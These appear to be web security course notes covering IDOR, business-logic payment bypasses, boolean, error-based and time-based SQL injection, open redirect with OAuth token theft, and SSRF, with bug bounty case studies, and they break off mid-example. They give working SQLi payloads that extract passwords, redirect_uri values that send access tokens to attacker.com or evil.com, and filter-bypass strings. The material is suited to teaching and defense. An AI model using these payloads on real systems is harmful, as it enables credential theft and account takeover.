<h4 id="view-statements-normal-scenario">VIEW STATEMENTS: NORMAL SCENARIO</h4>
<p>💡 1. Log in and Navigate to Statements
2. App will load account numbers that are owned by the user
3. POST viewStatement Session ID accountId= 800002
4. App will load details of selected account</p>
<h4 id="view-statements-attack-scenario">VIEW STATEMENTS: ATTACK SCENARIO</h4>
<p>💡 1. Log in and Navigate to Statements
2. App will load account numbers that are owned by the user
3. POST viewStatement Session ID accountId= 800007
4. App will load details of account passed by the attacker</p>
<h4 id="bug-bounty-case-study-1">BUG BOUNTY CASE STUDY</h4>
<p>💡 Vulnerability allowed disclosure of private attachments in Facebook Messenger Infrastructure
<a href="https://medium.com/bugbountywriteup/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486">medium.com</a></p>
<p>💡 While uploading attachement in messenger app he use the intercept to change the id number to another attachement, so he disclosed details about other user attachements.</p>
<p>💡 Vulnerability allowed Facebook Business Takeover
<a href="https://philippeharewood.com/facebook-business-takeover/">Facebook Business Takeover - These aren&rsquo;t the access_tokens you&rsquo;re looking for</a></p>
<p>💡 By sending a single HTTP request, an attacker can add an admin user to any business account
POST /business/aymc_assets/admins/import/ HTTP/1.1
Host: <a href="http://facebook.com/">facebook.com</a>
business_id=TARGET_BUSINESS_ID
admin_id=MALICIOUS_USER_ID
session_id=SESSION_ID</p>
<p>💡 Vulnerability allowed disclosure of a second order authorization bypass <a href="https://medium.com/m/global-identity?redirectUrl=https%3A%2F%2Fblog.heyday.xyz%2Fa-less-known-attack-vector-second-order-idor-attacks-14468009781a">medium.com</a></p>
<p>💡 As a first attempt to achieve authorization bypass, the researcher tried to change the transaction ID in the first request to get access to other users’ transaction details</p>
<p>💡 When the user visits /receipt_success.aspx, the application loads receipt ID stored in the user’s session and returns its details without performing any further authorization checks</p>
<p>💡 Attack senario:</p>
<ol>
<li>Attacker manipulates transaction ID</li>
<li>Illegal Transaction ID</li>
<li>User changes redirection location ⇒ receipt_success.aspx</li>
<li>App loads details of unauthorized transaction</li>
</ol>
<hr>
<h1 id="exercise-13-authorization-bypass">Exercise 1.3: Authorization Bypass</h1>
<ol>
<li>Attacker starts a new transaction (#1) and fills necessary data with amount of $10,000.</li>
<li>Attacker calls URI validateTransaction for transaction #1.</li>
<li>App will verify that the user has transaction limit and will ask the attacker to confirm on transaction #1.</li>
<li>Validation will pass; however, the attacker will not confirm on the transaction yet.</li>
<li>Attacker starts a new transaction (#2) and fills necessary data with amount of $10,000.</li>
<li>Attacker calls URI validateTransaction for transaction #2.</li>
<li>App will verify that the user has transaction limit and will ask the attacker to confirm on transaction #2.</li>
<li>Validation will pass and the attacker will start confirming on the two created transactions.</li>
<li>Attacker calls URI confirmTransaction for transaction #2.</li>
<li>App will commit transaction #2 as it has already passed validation.</li>
<li>Attacker calls URI confirmTransaction for transaction #1.</li>
<li>App will commit transaction #1 as it has already passed validation.</li>
<li>Total amount of committed transactions is $20,000.</li>
</ol>
<hr>
<h1 id="breaking-business-rules">Breaking Business Rules</h1>
<h4 id="insurance-payment">INSURANCE PAYMENT</h4>
<p>💡 1. Fill Insurance Info
2.  /payForCertificate
3. App calculates cost according to chosen plan and generates payment reference number axby
4. App redirects the user to MasterCard through MIGS API to pay the fee
5.  verifies on the hash
vpc_Amount  100
vpc_Currency  USD
vpc_ReturnURL ConfURL
vpc_ MerchTxnRef axby
…………………….
<code>vpc_SecureHash af17bf3..</code> for intergirti check!!
6. Renders form for filling credit card info
7. User Fills credit card info
8. Charges credit card and redirects the user to merchant
9. REDIRECTION TO APP
10. MasterCard redirects the user to the URL passed in vpc_ReturnURL
11. App reads the value of <code>vpc_MerchTxnRef</code> and delivers certificate without verification on
<code>vpc_SecureHash</code></p>
<h4 id="expensive-plan">EXPENSIVE PLAN</h4>
<p>💡 1. Fills Insurance Info for $2,000 USD plan
3. /payForCertificate
3. App calculates cost according to chosen plan and generates payment reference number 9zbf
4. App redirects the user to MasterCard through MIGS API to pay the fee
5. Keeps the reference value and drops the redirection
6. Fills Insurance Info for $50 USD plan
7. /payForCertificate
8. App calculates cost according to chosen plan and generates payment reference number 5a3f
9. App redirects the user to MasterCard through MIGS API to pay the fee
10. Follow the redirection and pay at MasterCard
11. MasterCard redirects the user to the URL passed in vpc_ReturnURL
12. Inserts reference value of expensive 9zbf certificate
13. App doesn’t check on vpc_SecureHash and delivers expensive certificate</p>
<h4 id="authorization-bypass-defenses">AUTHORIZATION BYPASS DEFENSES</h4>
<p>💡 The app should verify at the server in each operation that the user has access to such operation and the data to be processed.</p>
<p>Avoid taking critical authorization decisions based on untrusted predictable input from the client.</p>
<p>It is recommended to avoid depending on client-side authorization controls such as JavaScript or HTML, as such controls can be bypassed.</p>
<p>All authorization and business rules checks should be implemented at the server while utilizing centralized checks whenever possible.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html</a></p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html</a></p>
<hr>
<h1 id="sql-injection-and-context">SQL Injection and Context</h1>
<h4 id="sql-injection-normal-scenario">SQL INJECTION: NORMAL SCENARIO</h4>
<p>💡 1. /Search?title=news
2. Renders list of matching articles
3. App will fetch articles’ details by executing a SQL query</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> topic,summary <span style="color:#66d9ef">from</span> Articles <span style="color:#66d9ef">where</span> topic <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;news%&#39;</span>
</span></span></code></pre></div><h4 id="sql-injection-context">SQL INJECTION CONTEXT</h4>
<p>💡 What is the SQL <code>query statement</code> made by the app?
What is the <code>DBMS</code> used?
Where is our <code>input</code> placed in the query?
What will the app do with the SQL query <code>results</code>?
What are the <code>filters</code> employed by the app?</p>
<h4 id="sql-injection-parameters-analysis">SQL INJECTION PARAMETERS ANALYSIS</h4>
<p>💡 If the attacker entered &rsquo; or 1=1 &ndash; in the title parameter, the app would execute the following query on the DB :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> topic,summary <span style="color:#66d9ef">from</span> Articles <span style="color:#66d9ef">where</span> topic <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- %’
</span></span></span></code></pre></div><p>We can also pass the wild card character %
where condition will be where topic like <code>%%</code> which will retrieve all articles</p>
<hr>
<h1 id="boolean-based-sql-injection">Boolean-Based SQL Injection</h1>
<h4 id="sql-injection-boolean-context-normal-scenario">SQL INJECTION: BOOLEAN CONTEXT NORMAL SCENARIO</h4>
<p>💡 - <code>/checkStatus?refNum=ax2y</code>
App will search for the reference number in the database
<code>select * from Order where refNum ='ax2y'</code>
found ? Ticket will be delivered soon
not found ? Sorry, we can’t find your order</p>
<h4 id="sql-injection-boolean-true-condition">SQL INJECTION: BOOLEAN TRUE CONDITION</h4>
<p>💡</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">/</span>checkStatus<span style="color:#f92672">?</span>refNum<span style="color:#f92672">=</span> ax2y<span style="color:#e6db74">&#39; and &#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a<span style="color:#e6db74">&#39; select * from Order where refNum =&#39;</span>ax2y<span style="color:#e6db74">&#39; and &#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a<span style="color:#e6db74">&#39;
</span></span></span></code></pre></div><h4 id="sql-injection-asking-questions">SQL INJECTION: ASKING QUESTIONS</h4>
<p>💡 / checkStatus?refNum= ax2y<code>' and substring((select password from users where name='jsmith'),1,1)&gt;'f</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">Order</span> <span style="color:#66d9ef">where</span> refNum <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ax2y&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>((<span style="color:#66d9ef">select</span> password <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jsmith&#39;</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;f&#39;</span>
</span></span></code></pre></div><p>Renders message depending on query results</p>
<h4 id="boolean-based-sql-injection-case-study">BOOLEAN-BASED SQL INJECTION CASE STUDY</h4>
<p>💡 Boolean-based SQL injection in User-Agent Header
<a href="https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888">https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888</a></p>
<ul>
<li>
<p>Single quote in Useragent ⇒ unautherized</p>
</li>
<li>
<p>True and false conditions <code>‘ and ‘1’ = ‘1’</code> true  ⇒ worked</p>
</li>
<li>
<p><code>' and substring(@@version,1,1)=1='1' ‘</code> ⇒ version for DB</p>
</li>
</ul>
<p><code>' and substring(@@version,1,2)=0='0' '</code> to check if the second character is equal to 0</p>
<h4 id="bug-bounty-case-study-2">BUG BOUNTY CASE STUDY</h4>
<p>💡 Discovered Error-based SQL injection in Login feature
<a href="https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/">https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/</a></p>
<ul>
<li><code>Injected '\”</code> ⇒ <code>{&quot;email&quot;: &quot; 1'\&quot;&quot;, &quot;password&quot;: &quot;password&quot; }</code>
SQL syntax error ⇒</li>
</ul>
<p>{&ldquo;code&rdquo;:&ldquo;ER_PARSE_ERROR&rdquo;,&ldquo;errno&rdquo;:1064,&ldquo;sqlMessage&rdquo;:&ldquo;You have an error in
<code>your SQL syntax</code>; check the manual that corresponds to your <code>MySQL server</code>
version for the right syntax to use near &lsquo;&quot;1&rsquo;&quot;&quot; AND password=&quot;&quot;&rsquo; at line
1″,&ldquo;sqlState&rdquo;:&ldquo;42000″,&ldquo;index&rdquo;:0,&ldquo;sql&rdquo;:&quot;<code>SELECT id from Users WHERE email=\&quot;1'\&quot;\&quot; AND password=\&quot;'\&quot;&quot;}</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>a<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; and(extractvalue(1,concat(0x0a,@@version)))#
</span></span></span></code></pre></div><p>for the version</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>a<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; and(extractvalue(1,concat(0x0a,(select concat(password) from Users where id = 1 limit 0,1 ))))#
</span></span></span></code></pre></div><p>for the password</p>
<hr>
<h1 id="time-based-sql-injection">Time-Based SQL Injection</h1>
<h4 id="time-based-context-normal-scenario">TIME-BASED CONTEXT NORMAL SCENARIO</h4>
<p>💡 /subscribe?email=slax@gmail.com 
App will check on the entered email and add a subscription</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> subscription <span style="color:#66d9ef">where</span> email<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;smith@test.com&#39;</span>
</span></span></code></pre></div><p>Thank u for subscription ⇒ <em>The app is just sending back a single message</em>.</p>
<h4 id="time-based-discovery-technique">TIME-BASED DISCOVERY TECHNIQUE</h4>
<p>💡 /subscribe?email= <code>'+ sleep(15) + '</code></p>
<p>Response is delayed</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> subscription <span style="color:#66d9ef">where</span> email<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span> sleep(<span style="color:#ae81ff">15</span>) <span style="color:#f92672">+</span> <span style="color:#960050;background-color:#1e0010">‘</span>  <span style="color:#e6db74">&#39;
</span></span></span></code></pre></div><h4 id="asking-questions-with-time-based-technique">ASKING QUESTIONS WITH TIME-BASED TECHNIQUE</h4>
<p>💡 /subscribe?email=<code>'+IF(substring((select password from users where name='jsmith'),1,1) &gt; 'c', sleep(15), 0)+'</code></p>
<p>Response is delayed if the answer is Yes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> subscription <span style="color:#66d9ef">where</span> email<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">+</span> <span style="color:#66d9ef">IF</span>(<span style="color:#66d9ef">substring</span>((<span style="color:#66d9ef">select</span> password <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jsmith&#39;</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;f&#39;</span>, sleep(<span style="color:#ae81ff">15</span>), <span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span></code></pre></div><h4 id="bug-bounty-case-study-3">BUG BOUNTY CASE STUDY</h4>
<p>💡 Time-based SQL injection in file upload feature <a href="https://jspin.re/fileupload-blind-sqli/">https://jspin.re/fileupload-blind-sqli/</a></p>
<p>FINDING FILE UPLOAD FEATURE
Using self-registered user, a file upload feature was found within the application.</p>
<p>A random file was uploaded to check for any security control. The app was only
accepting:
• Only <code>PDF</code> files are accepted
• Uploaded files are scanned with <code>Antivirus</code></p>
<p>Click on the Upload button in the application and replace the original filename parameter with a time-based SQL injection payload: <code>poc.js'+(select*from(select(sleep(0)))a)+'.pdf</code></p>
<p>When the payload <code>poc.js'+(select*from (select(sleep(20)))a)+'.pdf</code> was inserted, the response time was 21,358 millis. This allows enumerating with time-based payloads to extract data from the server. This private program was handling sensitive personally identifiable information (PII)</p>
<p>💡 Starbucks SQL Injection  <a href="https://hackerone.com/reports/531051">https://hackerone.com/reports/531051</a></p>
<p>Interesting HTML file upload form.</p>
<p>Mapping and inspecting error messages revealed several info:
• Files were being processed as XML files
• App is using Microsoft Dynamics AX
• XML schema is revealed:
• <!-- raw HTML omitted -->, <!-- raw HTML omitted -->, <!-- raw HTML omitted -->, <!-- raw HTML omitted --></p>
<p>Normal value
<code>&lt;MainAccount&gt;123456&lt;/MainAccount&gt;</code>
Injecting Single quote caused parser issues:
<code>&lt;MainAccount&gt;123456'&lt;/MainAccount&gt;</code></p>
<p>ENCODING THE ATTACK PAYLOAD</p>
<p>Encoding the single quote led to database error :
<code>&lt;MainAccount&gt;123456'&lt;/MainAccount&gt;</code></p>
<p>💡 Vulnerability allowed time-based SQL injection <a href="https://hackerone.com/reports/150156">https://hackerone.com/reports/150156</a>
UBER UNSUBSCRIBE FEATURE</p>
<p>Unsubscribe link was discovered through advertisement mail received from Uber
Unsubscribe is formatted with a parameter encoded in base64 format:</p>
<p><a href="http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=%60eyJ1c2VyX2lkI">http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=`eyJ1c2VyX2lkI</a> jogIjU3NTUiLCAicmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ9`</p>
<p>Parameter encoded by base64:
<code>{&quot;user_id&quot;: &quot;5755&quot;, &quot;receiver&quot;: &quot;orange@mymail&quot;}</code></p>
<p>SQL INJECTION PAYLOAD:</p>
<pre tabindex="0"><code>http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=`eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==
</code></pre><p>Payload encoded by base64:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;user_id&#34;</span>: <span style="color:#e6db74">&#34;5755 and sleep(12)=1&#34;</span>, <span style="color:#f92672">&#34;receiver&#34;</span>:<span style="color:#e6db74">&#34;orange@mymail&#34;</span>}
</span></span></code></pre></div><h4 id="secure-usage-parameterizedprepared-sql-statements">SECURE USAGE PARAMETERIZED/PREPARED SQL STATEMENTS</h4>
<p>💡 One of the techniques that can be used in preventing SQL injection is the usage of Parameterized/Prepared SQL statements. It can help prepare a SQL statement in a way that lets untrusted input be interpreted as data. The example shown here is for PreparedStatement object in Java programming language. The method seString is used to read the untrusted value filled in the userid and pass parameters. The input accepted in such parameter will be interpreted as data, and it will not be considered SQL syntax.</p>
<h4 id="insecure-usage-parameterizedprepared-sql-statements">INSECURE USAGE PARAMETERIZED/PREPARED SQL STATEMENTS</h4>
<p>💡 The slide shows an example for insecure usage of Parameterized/Prepared SQL statements. The query is generated insecurely by dynamically concatenating untrusted values coming from the attacker. The PreparedStatement object was used to execute an untrusted SQL query, allowing SQL injection to occur.
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">cheatsheetseries.owasp.org</a></p>
<hr>
<h1 id="csrf-client-side-and-mobile-apis-attacks">CSRF, Client-Side, and Mobile APIs Attacks</h1>
<hr>
<h1 id="open-redirect">OPEN REDIRECT</h1>
<h4 id="normal-scenario">NORMAL SCENARIO</h4>
<p>💡</p>
<pre tabindex="0"><code>GET /main?redirect=http://sec552/accounts 
Host: sec552
</code></pre><p>App will redirect the user to the supplied URL</p>
<p>Attacker tricks victim to send a request filled with a malicious link
GET /main?redirect=http://attacker
Host: sec552</p>
<p>More dangerous when chained with other attacks such as XSS, CSRF, and SSRF</p>
<h4 id="bug-bounty-case-study-4">BUG BOUNTY CASE STUDY</h4>
<p>💡 Open Redirect vulnerability in <a href="http://chat.google.com/">chat.google.com</a> leads to account takeover through phishing inside the desktop app.
link : <a href="https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html">MB blog: Vulnerability in Hangouts Chat: from open redirect to code execution (bentkowski.info)</a></p>
<p>Google desktop chat application is almost the same as the web application on <a href="http://chat.google.com/">chat.google.com</a>, except that there is no address bar</p>
<ul>
<li>External links in the desktop app chat are opened in the browser</li>
<li>Links under <a href="http://chat.google.com/">chat.google.com</a> load inside the application</li>
<li>Interesting parameter for open redirection:
<a href="https://chat.google.com/accounts/ServiceLogin?continue=URL">https://chat.google.com/accounts/ServiceLogin?continue=URL</a>
• URL: <a href="http://bentkowski.info/">http://bentkowski.info</a>  Doesn’t work
• URL: <a href="https://appengine.google.com/">https://appengine.google.com</a>  Works</li>
</ul>
<p>The user will redirect to : <a href="https://chat.google.com/accounts/ServiceLogin?continue=https://appengine.google.com/_ah/conflogin?continue=http://bentkow%5D">https://chat.google.com/accounts/ServiceLogin?continue=https://appengine.google.com/_ah/conflogin?continue=http://bentkow]</a></p>
<h4 id="open-redirect-and-oauth2">OPEN REDIRECT AND OAUTH2</h4>
<p>💡 - Open redirect can help in bypassing Single Sign On that depends on OAuth2.</p>
<ul>
<li>Attackers can trick the user to send sensitive access tokens to the attack server.</li>
<li>The attack can lead to spoofing the user’s identity and conducting account takeover.</li>
<li>Common in bug bounty programs and can lead to great bounties.</li>
</ul>
<p><a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf">(blackhat.com)</a></p>
<h4 id="single-sign-on-using-oauth2">SINGLE SIGN ON USING OAUTH2</h4>
<p>💡 - The user visits the main app at <a href="https://main.app.com/">https://main.app.com</a></p>
<ul>
<li>The main app redirects the user to the SSO login URI: <a href="https://login.sso.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://main.a">https://login.SSO.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://main.a</a><a href="http://pp.com/validate">pp.com/validate</a></li>
<li>The user logs in and gets redirected back to the app URI: 3 <a href="https://main.app.com/validate?state=abc&amp;token=%7BAccess_Token%7D">https://main.app.com/validate?state=abc&amp;token={Access_Token}</a></li>
<li>The main app now has an access token that can be used to load user’s info.</li>
</ul>
<h4 id="open-redirect--attack-scenario-i">OPEN REDIRECT – ATTACK SCENARIO I</h4>
<p>💡 - Attacker crafts a URI while filling malicious value in redirect_uri:
<a href="https://login.sso.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://attack">https://login.SSO.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://attack</a><a href="http://er.com/">er.com</a></p>
<ul>
<li>Once the victim user visits the crafted link and logs in, the app will redirect the user to the
attacker server: <a href="https://attacker.com/?state=abc&amp;token=%7BAccess_Token%7D">https://attacker.com?state=abc&amp;token={Access_Token}</a></li>
<li>Attacker steals the access token and takes over victim’s account</li>
</ul>
<h4 id="defenses-and-bypasses">DEFENSES AND BYPASSES</h4>
<p>💡 <strong>Defense</strong>
App validates on the value of redirect_uri parameter to ensure that it contains the
URL of the subdomain <a href="http://main.app.com/">main.app.com</a></p>
<p><strong>Bypass</strong>
The attacker can bypass such defense by inserting the URL in different ways. Example
payloads that bypasses such filter include:
<a href="https://main.app.com.attacker.com/">https://main.app.com.attacker.com</a>
<a href="https://main.app.com@attacker.com/">https://main.app.com@attacker.com/</a>
<a href="https://attacker.com/https://main.app.com">https://attacker.com/https://main.app.com</a></p>
<h4 id="open-redirection--attack-scenario-ii">OPEN REDIRECTION – ATTACK SCENARIO II</h4>
<p>💡 If there is proper whitelist validation on the subdomain filled in redirect_uri, Open Redirect can help to bypass such filter:</p>
<ul>
<li>Attacker crafts a URI while filling redirect_uri parameter with a location that is vulnerable
to Open Redirect:
<a href="https://login.sso.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://main">https://login.SSO.com/oauth?clientid=123&amp;state=abc&amp;redirect_uri=https://main</a>.
<a href="http://app.com/vuln?uri%3dhttps://attacker">app.com/vuln?uri%3Dhttps://attacker</a></li>
<li>Once the victim user clicks on the link and logs in, the victim user will get redirected to:
<a href="https://main.app/vuln?uri=https://attacker?token=%7BAccess_Token%7D">https://main.app/vuln?uri=https://attacker?token={Access_Token}</a></li>
<li>If there is Open Redirect in parameter uri, the user will get redirected to: 3 <a href="https://attacker.com/?token=%7BAccess_Token%7D">https://attacker.com?token={Access_Token}</a></li>
</ul>
<h4 id="open-redirect--bug-bounty-case-study-i">OPEN REDIRECT – BUG BOUNTY CASE STUDY I</h4>
<p>💡 Example Open Redirect attack payload reported to TTS Bug Bounty by manshum12 through
Hacker One:
<a href="https://login.fr.cloud.gov/oauth/authorize?client_id=%E2%96%88%E2%96%88%E2%25">https://login.fr.cloud.gov/oauth/authorize?client_id=██�%</a>
96%88&amp;response_type=token&amp;redirect_uri=https%3A%2F%<a href="http://2fevil.com/">2Fevil.com</a>%2Fauth%
2Fcallback&amp;state=%E2%96%88%E2%96%88%E2%96%88</p>
<ul>
<li>The payload redirects the victim user to <a href="http://evil.com/">evil.com</a> through the redirect_uri parameter and
allows the attacker to steal OAuth access tokens.
<a href="https://hackerone.com/reports/665651">HackerOne</a> Report</li>
</ul>
<h4 id="open-redirect--bug-bounty-case-study-ii">OPEN REDIRECT – BUG BOUNTY CASE STUDY II</h4>
<p>💡 Example Open Redirect attack payload reported to BOHEMIA INTERACTIVE a.s. by Ethan
Cruize through Hacker One:
<a href="https://accounts.bistudio.com/api/auth?response_type=code&amp;redirect_uri=http%253">https://accounts.bistudio.com/api/auth?response_type=code&amp;redirect_uri=http%3</a>
A%2F%<a href="http://2fxbox.dayz.comtest.com/">2Fxbox.dayz.comtest.com</a>%2Fapi%2Fauth%2Fcallback&amp;state=OCoU2Lvh
mzLGAZ03DWem5QNs&amp;client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3</p>
<ul>
<li>The researcher passed the payload <a href="http://xbox.dayz.comtest.com/">xbox.dayz.comtest.com</a> to bypass the subdomain
filter of <a href="http://xbox.dayz.com/">xbox.dayz.com</a> redirecting the victim user to <a href="http://comtest.com/">comtest.com</a> which is controlled
by the attacker.
<a href="https://hackerone.com/reports/405100">HackerOne</a></li>
</ul>
<hr>
<h1 id="server-side-request-forgery">SERVER-SIDE REQUEST FORGERY</h1>
<p>💡 SERVER-SIDE REQUEST FORGERY (SSRF): NORMAL SCENARIO</p>
<p><code>GET /viewImage? url= [http://pic/profile.png](http://pic/profile.png) Host: app</code></p>
<ul>
<li>App will fetch the content of the photo from the URL</li>
</ul>
<p><code>GET /profile.png Host: pic</code></p>
<ul>
<li>Render image content in the response</li>
</ul>
<p>💡 SSRF: ATTACKER DISCOVERY SCENARIO</p>
<ol>
<li>GET
/viewImage?url=http://attacker/test
Host: app</li>
<li>App will send a request to the attacker server</li>
<li>GET /test
Host: attacker</li>
<li>Render attack server response</li>
</ol>
<p><a href="https://github.com/teknogeek/ssrf-sheriff">https://github.com/teknogeek/ssrf-sheriff</a></p>
<h4 id="ssrf-attacker-exploitation-scenario">SSRF: ATTACKER EXPLOITATION SCENARIO</h4>
<p>💡 GET /viewImage?
url=http://172.16.1.5/api/viewUser?id=1
Host: app</p>
<ol>
<li>GET /api/viewUser?id=1
Host: 172.16.1.5</li>
<li>Render API call response</li>
</ol>
<h4 id="ssrf-defenses-and-bypasses-1">SSRF DEFENSES AND BYPASSES (1)</h4>
<p>💡 <strong>Defense</strong>
App blocks input containing 172.16.1.5
App will block the following payload
viewImage?url=http://172.16.1.5/api/viewUser?id=1
<strong>Bypass</strong>
Attacker bypasses defense by entering IPv6 payload
viewImage?url=http://0:0:0:0:0:ffff:ac10:105/api/viewUser?id=1</p>
<h4 id="ssrf-defenses-and-bypasses-2">SSRF DEFENSES AND BYPASSES (2)</h4>
<p>💡 <strong>Defense</strong>
App blocks input that contains IPv4 or IPv6 of 172.16.1.5
App will block the following payloads
viewImage?url=http://172.16.1.5/api/viewUser?id=1
viewImage?url=http://0:0:0:0:0:ffff:ac10:105/api/viewUser?id=1
<strong>Bypass</strong>
Attacker bypasses defense by entering
viewImage?url=http://attacker/
Attacker server will redirect the app to internal IP 172.16.1.5
<a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">Server Side Request Forgery Prevention - OWASP Cheat Sheet Series</a></p>
<h4 id="ssrf-bug-bounty-case-study">SSRF BUG BOUNTY CASE STUDY</h4>
<p>💡 <a href="https://w00troot.blogspot.com/2017/12/how-i-found-ssrf-on-thefacebookcom.html">Security Research * Penetration Testing Blog: How I found SSRF on TheFacebook.com (w00troot.blogspot.com)</a></p>
<ul>
<li>Oracle WebLogic Server on <a href="https://esbmbltest.thefacebook.com/">https://esbmbltest.thefacebook.com/</a></li>
<li>Parameter “operator” is filled with a URL value when using the “Search” feature</li>
<li>Attacker IP is passed in “operator” parameter</li>
<li>Attacker machine received a request on port 443</li>
<li>Live internal IP address operator=http://192.168.48.1</li>
<li>Server responds relatively faster when the internal IP is live</li>
<li>Not found internal IP address operator=http://192.168.48.5</li>
<li>Inspecting response time: More than 120,538 millis</li>
</ul>
<h4 id="ssrf-bug-bounty-case-study-1">SSRF BUG BOUNTY CASE STUDY</h4>
<p>💡 <a href="https://infosecwriteups.com/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e">Vimeo SSRF with code execution potential. | by Harsh Jaiswal | InfoSec Write-ups (infosecwriteups.com)</a></p>
<ul>
<li>
<p>Analysize the parameters to understand</p>
</li>
<li>
<p>PARAMETERS ANALYSIS
Request body parameters
• method: get
• uri: /users/{user_id}/videos/{video_id}
• segments: user_id: 80898505 video_id: 111
Server-side GET request is sent to the endpoint
• <a href="https://api.vimeo.com/users/80898505">https://api.vimeo.com/users/80898505</a> /videos/111</p>
</li>
</ul>
<p>PARAMETERS MANIPULATION
Request body parameters
• method: get
• uri: /users/{user_id}/videos/{video_id}
• segments: user_id: 1122 video_id: 111
Server-side GET request is sent to the endpoint
• <a href="https://api.vimeo.com/users/1122">https://api.vimeo.com/users/1122</a> /videos/111</p>
<p>MANIPULATING THE SERVER-SIDE REQUEST URI</p>
<ul>
<li>Input  video_id: ../../../
